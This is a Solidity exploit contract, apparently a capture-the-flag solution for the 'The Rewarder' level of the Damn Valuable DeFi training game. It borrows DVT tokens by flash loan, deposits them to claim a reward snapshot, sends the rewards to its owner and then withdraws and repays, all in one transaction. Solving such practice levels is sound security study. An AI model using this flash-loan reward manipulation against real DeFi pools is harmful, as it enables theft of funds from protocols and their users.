import {TheRewarderPool} from "./TheRewarderPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {RewardToken} from "./RewardToken.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";

contract Attacker {
    address immutable owner;
    FlashLoanerPool immutable flashLoanerPool;
    TheRewarderPool immutable rewarderPool;
    DamnValuableToken immutable liquidityToken;
    RewardToken immutable rewardToken;

    constructor(address _rewarderPool, address _flashLoaner, address _dvt, address _rewardToken) {
        owner = msg.sender;
        flashLoanerPool = FlashLoanerPool(_flashLoaner);
        rewarderPool = TheRewarderPool(_rewarderPool);
        liquidityToken = DamnValuableToken(_dvt);
        rewardToken = RewardToken(_rewardToken);
    }

    function attack(uint256 _amount) external {
        flashLoanerPool.flashLoan(_amount);
    }

    function receiveFlashLoan(uint256 _amount) external {
        liquidityToken.approve(address(rewarderPool), _amount);
        rewarderPool.deposit(_amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
        rewarderPool.withdraw(_amount);
        liquidityToken.transfer(address(flashLoanerPool), _amount);
    }
}
